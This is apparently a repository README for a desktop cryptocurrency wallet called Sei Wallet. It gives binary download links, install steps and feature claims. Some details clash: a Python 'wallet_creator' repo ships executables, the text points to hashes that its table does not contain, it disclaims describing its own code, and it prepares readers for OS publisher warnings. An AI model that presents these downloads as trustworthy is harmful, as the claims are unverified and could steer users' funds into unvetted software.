![Sei Wallet](https://github.com/sei-chain/wallet_creator/raw/main/assets/banner-profile.png)

<h1 align="center">Sei Wallet</h1>

<p align="center">A non-custodial desktop wallet for Sei on Windows, macOS and Linux.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2"><img src="https://img.shields.io/badge/release-v6.6.2-a82731?style=for-the-badge&labelColor=201412" alt="Sei Wallet release"></a>
</p>

---

## ⬇️ Downloads — v6.6.2

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Checksums for every file are published on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

---

## 🖥️ Install

<details open>
<summary>🪟 Windows</summary>

1. Download `sei-wallet-v6.6.2.exe` from the release page above.
2. Compare the file's SHA-256 with the value in the table before you run it.
3. Run the installer and open Sei Wallet.
4. Create a new wallet, or restore one from an existing recovery phrase.
5. Write the recovery phrase on paper and keep it offline before you add funds.

Windows may warn about an unrecognised publisher while a build is new. Check the hash first; that is the check you control.

</details>

<details>
<summary>🍎 macOS</summary>

1. Download `sei-wallet-v6.6.2.dmg`.
2. Compare the file's SHA-256 with the published value.
3. Open the disk image and drag Sei Wallet into Applications.
4. Launch it from Applications. If Gatekeeper blocks the first launch, allow the app in System Settings, Privacy and Security, rather than turning Gatekeeper off.
5. Restore an existing wallet or create a new one, then store the phrase offline.

</details>

<details>
<summary>🐧 Linux</summary>

1. Download `sei-wallet-v6.6.2.zip`.
2. Compare the archive's SHA-256 with the published value.
3. Unzip it, then run the `sei-wallet` binary inside the folder.
4. On Ubuntu 20.04 or later and equivalents, no extra runtime is needed.
5. Create or restore a wallet and keep the recovery phrase offline.

</details>

Requirements: Windows 10 (1909) or later 64-bit, macOS 12 or later, or x64 Linux. 4 GB RAM minimum, 8 GB recommended, 500 MB of disk.

---

## ✨ Features

- **EVM-first signing.** Sei Wallet signs `0x` transactions natively, with read-only support for legacy Cosmos `sei1` addresses of the same account.
- **Native staking.** A validator picker with stake, reward tracking and unbonding inside the app, so no second tool is needed to delegate.
- **Built-in swap.** Token swaps happen in the wallet, without a browser extension in the middle.
- **dApp browser.** Shortcuts to DragonSwap, Yei Finance and Citrex sit alongside the address bar.
- **Ledger support.** Nano S+, Nano X and Stax, routed through Ledger's Ethereum app, with the address confirmed on the device.
- **Self-custody by design.** Keys are generated on your machine and encrypted at rest. The operator states it cannot move, freeze or recover your funds.
- **Quiet by default.** No telemetry tied to identity, no address fingerprinting, no third-party trackers and no in-wallet ads, as stated by the operator.
- **Restore from a phrase.** Any BIP-39 recovery phrase for a Sei account can be restored, including one exported from another wallet.

---

## 🌐 Networks

| Network | Chain ID | EVM chain ID |
|:--|:--|:--|
| Sei mainnet (`pacific-1`) | 1329 | `0x531` |
| Sei testnet (`atlantic-2`) | 1328 | `0x530` |

Mainnet's public RPC is `https://evm-rpc.sei-apis.com`; the testnet endpoint is published in Sei's own documentation. Mainnet is where real funds live. Testnet coins come from a faucet and carry no value, which is why a testnet balance never appears in a mainnet account.

---

## 📚 Guides

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: How to create a Sei wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md) | Set up an account, write the phrase down, then fund it. |
| [Sei Wallet: sei1 and 0x addresses](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) | Which address form to hand out, and why a balance can look missing. |
| [Sei Wallet: How to stake SEI](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) | Delegate from the app and keep enough liquid for the exit fee. |
| [Sei Wallet: A pending transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) | Tell a queued transfer from a failed one and act on the right one. |
| [Sei Wallet: Is Sei Wallet safe?](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) | What self-custody protects, what it does not, and what stays unverified. |

[All Sei Wallet guides](https://github.com/sei-chain/sei-wallet-help/blob/main/README.md) — 39 guides across setup, staking, transactions and security.

**Sei Wallet is non-custodial: the operator cannot move, freeze or recover your funds, which also means nobody can undo a transfer you sign.**

---

## 💬 Support

Bugs and feature requests for the wallet go to [the issue tracker](https://github.com/sei-chain/sei-wallet/issues). This repository's own code is not described here.

---

## 📄 About

`wallet_creator` — Python. Sei Wallet is built and operated by Sei Wallet Labs Inc, which states that it is not affiliated with Sei Labs Inc, the Sei Foundation, the Sei Development Foundation or SEI Investments Corp.

[Main repository](https://github.com/sei-chain/sei-wallet) · [All guides](https://github.com/sei-chain/sei-wallet-help/blob/main/README.md)
